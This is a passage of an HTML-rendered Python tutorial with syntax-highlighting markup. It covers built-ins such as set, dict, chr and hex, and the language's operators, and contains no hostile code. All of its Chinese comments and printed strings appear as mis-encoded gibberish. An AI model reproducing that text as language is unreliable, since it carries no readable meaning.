class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="class-set-iterable"><a href="#class-set-iterable" class="headerlink" title="class set([iterable])"></a><code>class set([iterable])</code></h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># set() å‡½æ•°åˆ›å»ºä¸€ä¸ªæ— åºä¸é‡å¤å…ƒç´ é›†</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="class-dict-kwarg"><a href="#class-dict-kwarg" class="headerlink" title="class dict(**kwarg)"></a><code>class dict(**kwarg)</code></h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">'''class dict(**kwarg)class dict(mapping, **kwarg)class dict(iterable, **kwarg)åˆ›å»ºä¸€ä¸ªå­—å…¸'''</span><span class="token builtin">dict</span><span class="token punctuation">(</span>a<span class="token operator">=</span><span class="token string">'a'</span><span class="token punctuation">,</span> b<span class="token operator">=</span><span class="token string">'b'</span><span class="token punctuation">,</span> t<span class="token operator">=</span><span class="token string">'t'</span><span class="token punctuation">)</span>     <span class="token comment"># ä¼ å…¥å…³é”®å­—</span><span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token builtin">zip</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'one'</span><span class="token punctuation">,</span> <span class="token string">'two'</span><span class="token punctuation">,</span> <span class="token string">'three'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># æ˜ å°„å‡½æ•°æ–¹å¼æ¥æ„é€ å­—å…¸</span><span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">'one'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'two'</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'three'</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment"># å¯è¿­ä»£å¯¹è±¡æ–¹å¼æ¥æ„é€ å­—å…¸</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="class-frozenset-iterable"><a href="#class-frozenset-iterable" class="headerlink" title="class frozenset([iterable])"></a><code>class frozenset([iterable])</code></h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># è¿”å›ä¸€ä¸ªå†»ç»“çš„é›†åˆï¼Œå†»ç»“åé›†åˆä¸èƒ½å†æ·»åŠ æˆ–åˆ é™¤ä»»ä½•å…ƒç´ </span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">frozenset</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="chr-i"><a href="#chr-i" class="headerlink" title="chr(i)"></a><code>chr(i)</code></h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># è¿”å›å€¼æ˜¯å½“å‰æ•´æ•°å¯¹åº”çš„ ASCII å­—ç¬¦</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#0</span><span class="token comment">#0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="ord-c"><a href="#ord-c" class="headerlink" title="ord(c)"></a><code>ord(c)</code></h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># è¿”å›å¯¹åº”çš„ ASCII æ•°å€¼ï¼Œæˆ–è€… Unicode æ•°å€¼</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#97</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="hex-x"><a href="#hex-x" class="headerlink" title="hex(x)"></a><code>hex(x)</code></h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># å°†10è¿›åˆ¶æ•´æ•°è½¬æ¢æˆ16è¿›åˆ¶ï¼Œä»¥å­—ç¬¦ä¸²å½¢å¼è¡¨ç¤º</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#0x14</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="oct-x"><a href="#oct-x" class="headerlink" title="oct(x)"></a><code>oct(x)</code></h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># å°†ä¸€ä¸ªæ•´æ•°è½¬æ¢æˆ 8 è¿›åˆ¶å­—ç¬¦ä¸²</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">oct</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#0o12</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="æ³¨é‡Š-1"><a href="#æ³¨é‡Š-1" class="headerlink" title="æ³¨é‡Š"></a>æ³¨é‡Š</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># å•è¡Œæ³¨é‡Š</span><span class="token triple-quoted-string string">'''å¤šè¡Œæ³¨é‡Š'''</span><span class="token triple-quoted-string string">"""å¤šè¡Œæ³¨é‡Š"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="è¿ç®—ç¬¦"><a href="#è¿ç®—ç¬¦" class="headerlink" title="è¿ç®—ç¬¦"></a>è¿ç®—ç¬¦</h2><h3 id="ç®—æ•°è¿ç®—ç¬¦"><a href="#ç®—æ•°è¿ç®—ç¬¦" class="headerlink" title="ç®—æ•°è¿ç®—ç¬¦"></a>ç®—æ•°è¿ç®—ç¬¦</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> <span class="token number">4</span>b <span class="token operator">=</span> <span class="token number">3</span>c <span class="token operator">=</span> <span class="token number">0</span>c <span class="token operator">=</span> a <span class="token operator">+</span> b<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c çš„å€¼ä¸ºï¼š"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment"># 7</span>c <span class="token operator">=</span> a <span class="token operator">-</span> b<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c çš„å€¼ä¸ºï¼š"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment"># 1</span>c <span class="token operator">=</span> a <span class="token operator">*</span> b<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c çš„å€¼ä¸ºï¼š"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment"># 12</span>c <span class="token operator">=</span> a <span class="token operator">/</span> b<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c çš„å€¼ä¸ºï¼š"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment"># 1.3333333333333333</span>c <span class="token operator">=</span> a <span class="token operator">%</span> b<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c çš„å€¼ä¸ºï¼š"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment"># 1</span>a <span class="token operator">=</span> <span class="token number">4</span>b <span class="token operator">=</span> <span class="token number">3</span>c <span class="token operator">=</span> a <span class="token operator">**</span> b  <span class="token comment"># ä¹˜æ–¹</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c çš„å€¼ä¸ºï¼š"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment"># 64</span>a <span class="token operator">=</span> <span class="token number">10</span>b <span class="token operator">=</span> <span class="token number">5</span>c <span class="token operator">=</span> a <span class="token operator">//</span> b  <span class="token comment"># å–æ•´é™¤</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c çš„å€¼ä¸ºï¼š"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment"># 2</span><span class="token triple-quoted-string string">'''c çš„å€¼ä¸ºï¼š 7c çš„å€¼ä¸ºï¼š 1c çš„å€¼ä¸ºï¼š 12c çš„å€¼ä¸ºï¼š 1.3333333333333333c çš„å€¼ä¸ºï¼š 1c çš„å€¼ä¸ºï¼š 64c çš„å€¼ä¸ºï¼š 2'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ¯”è¾ƒè¿ç®—ç¬¦"><a href="#æ¯”è¾ƒè¿ç®—ç¬¦" class="headerlink" title="æ¯”è¾ƒè¿ç®—ç¬¦"></a>æ¯”è¾ƒè¿ç®—ç¬¦</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> <span class="token number">21</span>b <span class="token operator">=</span> <span class="token number">10</span>c <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">==</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a ç­‰äº b"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a ä¸ç­‰äº b"</span><span class="token punctuation">)</span><span class="token comment"># a ä¸ç­‰äº b</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">!=</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a ä¸ç­‰äº b"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a ç­‰äº b"</span><span class="token punctuation">)</span><span class="token comment"># a ä¸ç­‰äº b</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">&lt;</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a å°äº b"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a å¤§äºç­‰äº b"</span><span class="token punctuation">)</span><span class="token comment"># a å¤§äºç­‰äº b</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">&gt;</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a å¤§äº b"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a å°äºç­‰äº b"</span><span class="token punctuation">)</span><span class="token comment"># a å¤§äº b</span><span class="token comment"># ä¿®æ”¹å˜é‡ a å’Œ b çš„å€¼</span>a <span class="token operator">=</span> <span class="token number">5</span>b <span class="token operator">=</span> <span class="token number">20</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">&lt;=</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a å°äºç­‰äº b"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a å¤§äº  b"</span><span class="token punctuation">)</span><span class="token comment"># a å°äºç­‰äº b</span><span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">&gt;=</span> a<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"b å¤§äºç­‰äº a"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"b å°äº a"</span><span class="token punctuation">)</span><span class="token comment"># b å¤§äºç­‰äº a    </span><span class="token triple-quoted-string string">'''a ä¸ç­‰äº ba ä¸ç­‰äº ba å¤§äºç­‰äº ba å¤§äº ba å°äºç­‰äº bb å¤§äºç­‰äº a'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="èµ‹å€¼è¿ç®—ç¬¦"><a href="#èµ‹å€¼è¿ç®—ç¬¦" class="headerlink" title="èµ‹å€¼è¿ç®—ç¬¦"></a>èµ‹å€¼è¿ç®—ç¬¦</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> <span class="token number">21</span>b <span class="token operator">=</span> <span class="token number">10</span>c <span class="token operator">=</span> <span class="token number">0</span>c <span class="token operator">=</span> a <span class="token operator">+</span> b<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c çš„å€¼ä¸ºï¼š"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment"># 31</span>c <span class="token operator">+=</span> a<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c çš„å€¼ä¸ºï¼š"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment"># 52</span>c <span class="token operator">*=</span> a<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c çš„å€¼ä¸ºï¼š"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment"># 1092</span>c <span class="token operator">/=</span> a<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c çš„å€¼ä¸ºï¼š"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment"># 52.0</span>c <span class="token operator">=</span> <span class="token number">2</span>c <span class="token operator">%=</span> a<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c çš„å€¼ä¸ºï¼š"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment"># 2</span>c <span class="token operator">**=</span> a<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c çš„å€¼ä¸ºï¼š"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment"># 2097152</span>c <span class="token operator">//=</span> a<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c çš„å€¼ä¸ºï¼š"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment"># 99864</span><span class="token triple-quoted-string string">'''c çš„å€¼ä¸ºï¼š 31c çš„å€¼ä¸ºï¼š 52c çš„å€¼ä¸ºï¼š 1092c çš„å€¼ä¸ºï¼š 52.0c çš„å€¼ä¸ºï¼š 2c çš„å€¼ä¸ºï¼š 2097152c çš„å€¼ä¸ºï¼š 99864'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ä½è¿ç®—ç¬¦"><a href="#ä½è¿ç®—ç¬¦" class="headerlink" title="ä½è¿ç®—ç¬¦"></a>ä½è¿ç®—ç¬¦</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> <span class="token number">60</span>  <span class="token comment"># 60 = 0011 1100</span>b <span class="token operator">=</span> <span class="token number">13</span>  <span class="token comment"># 13 = 0000 1101</span>c <span class="token operator">=</span> <span class="token number">0</span>c <span class="token operator">=</span> a <span class="token operator">&amp;</span> b  <span class="token comment"># 12 = 0000 1100</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c çš„å€¼ä¸ºï¼š"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment"># 12</span>c <span class="token operator">=</span> a <span class="token operator">|</span> b  <span class="token comment"># 61 = 0011 1101</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c çš„å€¼ä¸ºï¼š"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment"># 61</span>c <span class="token operator">=</span> a <span class="token operator">^</span> b  <span class="token comment"># 49 = 0011 0001</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c çš„å€¼ä¸ºï¼š"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment"># 49</span>c <span class="token operator">=</span> <span class="token operator">~</span>a  <span class="token comment"># -61 = 1100 0011</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c çš„å€¼ä¸ºï¼š"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment"># -61</span>c <span class="token operator">=</span> a <span class="token operator">&lt;&lt;</span> <span class="token number">2</span>  <span class="token comment"># 240 = 1111 0000</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c çš„å€¼ä¸ºï¼š"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment"># 240</span>c <span class="token operator">=</span> a <span class="token operator">&gt;&gt;</span> <span class="token number">2</span>  <span class="token comment"># 15 = 0000 1111</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c çš„å€¼ä¸ºï¼š"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment"># 15</span><span class="token triple-quoted-string string">'''c çš„å€¼ä¸ºï¼š 12c çš„å€¼ä¸ºï¼š 61c çš„å€¼ä¸ºï¼š 49c çš„å€¼ä¸ºï¼š -61c çš„å€¼ä¸ºï¼š 240c çš„å€¼ä¸ºï¼š 15'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="é€»è¾‘è¿ç®—ç¬¦"><a href="#é€»è¾‘è¿ç®—ç¬¦" class="headerlink" title="é€»è¾‘è¿ç®—ç¬¦"></a>é€»è¾‘è¿ç®—ç¬¦</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> <span class="token number">10</span>b <span class="token operator">=</span> <span class="token number">20</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token keyword">and</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"å˜é‡ a å’Œ b éƒ½ä¸º true"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"å˜é‡ a å’Œ b æœ‰ä¸€ä¸ªä¸ä¸º true"</span><span class="token punctuation">)</span><span class="token comment"># å˜é‡ a å’Œ b éƒ½ä¸º true</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token keyword">or</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"å˜é‡ a å’Œ b éƒ½ä¸º trueï¼Œæˆ–å…¶ä¸­ä¸€ä¸ªå˜é‡ä¸º true"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"å˜é‡ a å’Œ b éƒ½ä¸ä¸º true"</span><span class="token punctuation">)</span><span class="token comment"># å˜é‡ a å’Œ b éƒ½ä¸º trueï¼Œæˆ–å…¶ä¸­ä¸€ä¸ªå˜é‡ä¸º true</span><span class="token comment"># ä¿®æ”¹å˜é‡ a çš„å€¼</span>a <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token keyword">and</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"å˜é‡ a å’Œ b éƒ½ä¸º true"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"å˜é‡ a å’Œ b æœ‰ä¸€ä¸ªä¸ä¸º true"</span><span class="token punctuation">)</span><span class="token comment"># å˜é‡ a å’Œ b æœ‰ä¸€ä¸ªä¸ä¸º true</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token keyword">or</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"å˜é‡ a å’Œ b éƒ½ä¸º trueï¼Œæˆ–å…¶ä¸­ä¸€ä¸ªå˜é‡ä¸º true"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"å˜é‡ a å’Œ b éƒ½ä¸ä¸º true"</span><span class="token punctuation">)</span><span class="token comment"># å˜é‡ a å’Œ b éƒ½ä¸º trueï¼Œæˆ–å…¶ä¸­ä¸€ä¸ªå˜é‡ä¸º true</span><span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token punctuation">(</span>a <span class="token keyword">and</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"å˜é‡ a å’Œ b éƒ½ä¸º falseï¼Œæˆ–å…¶ä¸­ä¸€ä¸ªå˜é‡ä¸º false"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"å˜é‡ a å’Œ b éƒ½ä¸º true"</span><span class="token punctuation">)</span><span class="token comment"># å˜é‡ a å’Œ b éƒ½ä¸º falseï¼Œæˆ–å…¶ä¸­ä¸€ä¸ªå˜é‡ä¸º false    </span><span class="token triple-quoted-string string">'''å˜é‡ a å’Œ b éƒ½ä¸º trueå˜é‡ a å’Œ b éƒ½ä¸º trueï¼Œæˆ–å…¶ä¸­ä¸€ä¸ªå˜é‡ä¸º trueå˜é‡ a å’Œ b æœ‰ä¸€ä¸ªä¸ä¸º trueå˜é‡ a å’Œ b éƒ½ä¸º trueï¼Œæˆ–å…¶ä¸­ä¸€ä¸ªå˜é‡ä¸º trueå˜é‡ a å’Œ b éƒ½ä¸º falseï¼Œæˆ–å…¶ä¸­ä¸€ä¸ªå˜é‡ä¸º false'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æˆå‘˜è¿ç®—ç¬¦"><a href="#æˆå‘˜è¿ç®—ç¬¦" class="headerlink" title="æˆå‘˜è¿ç®—ç¬¦"></a>æˆå‘˜è¿ç®—ç¬¦</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> <span class="token number">10</span>b <span class="token operator">=</span> <span class="token number">20</span><span class="token builtin">list</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"å˜é‡ a åœ¨ç»™å®šçš„åˆ—è¡¨ä¸­ list ä¸­"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"å˜é‡ a ä¸åœ¨ç»™å®šçš„åˆ—è¡¨ä¸­ list ä¸­"</span><span class="token punctuation">)</span><span class="token comment"># å˜é‡ a ä¸åœ¨ç»™å®šçš„åˆ—è¡¨ä¸­ list ä¸­</span><span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"å˜é‡ b ä¸åœ¨ç»™å®šçš„åˆ—è¡¨ä¸­ list ä¸­"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"å˜é‡ b åœ¨ç»™å®šçš„åˆ—è¡¨ä¸­ list ä¸­"</span><span class="token punctuation">)</span><span class="token comment"># å˜é‡ b ä¸åœ¨ç»™å®šçš„åˆ—è¡¨ä¸­ list ä¸­</span><span class="token comment"># ä¿®æ”¹å˜é‡ a çš„å€¼</span>a <span class="token operator">=</span> <span class="token number">2</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"å˜é‡ a åœ¨ç»™å®šçš„åˆ—è¡¨ä¸­ list ä¸­"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"å˜é‡ a ä¸åœ¨ç»™å®šçš„åˆ—è¡¨ä¸­ list ä¸­"</span><span class="token punctuation">)</span><span class="token comment"># å˜é‡ a åœ¨ç»™å®šçš„åˆ—è¡¨ä¸­ list ä¸­</span><span class="token triple-quoted-string string">'''å˜é‡ a ä¸åœ¨ç»™å®šçš„åˆ—è¡¨ä¸­ list ä¸­å˜é‡ b ä¸åœ¨ç»™å®šçš„åˆ—è¡¨ä¸­ list ä¸­å˜é‡ a åœ¨ç»™å®šçš„åˆ—è¡¨ä¸­ list ä¸­'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="èº«ä»½è¿ç®—ç¬¦"><a href="#èº«ä»½è¿ç®—ç¬¦" class="headerlink" title="èº«ä»½è¿ç®—ç¬¦"></a>èº«ä»½è¿ç®—ç¬¦</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> <span class="token number">20</span>b <span class="token operator">=</span> <span class="token number">20</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token keyword">is</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a å’Œ b æœ‰ç›¸åŒçš„æ ‡è¯†"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a å’Œ b æ²¡æœ‰ç›¸åŒçš„æ ‡è¯†"</span><span class="token punctuation">)</span><span class="token comment"># a å’Œ b æœ‰ç›¸åŒçš„æ ‡è¯†</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">id</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a å’Œ b æœ‰ç›¸åŒçš„æ ‡è¯†"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a å’Œ b æ²¡æœ‰ç›¸åŒçš„æ ‡è¯†"</span><span class="token punctuation">)</span><span class="token comment"># a å’Œ b æœ‰ç›¸åŒçš„æ ‡è¯†</span><span class="token comment"># ä¿®æ”¹å˜é‡ b çš„å€¼</span>b <span class="token operator">=</span> <span class="token number">30</span><span class="token keyword">if</span> <span 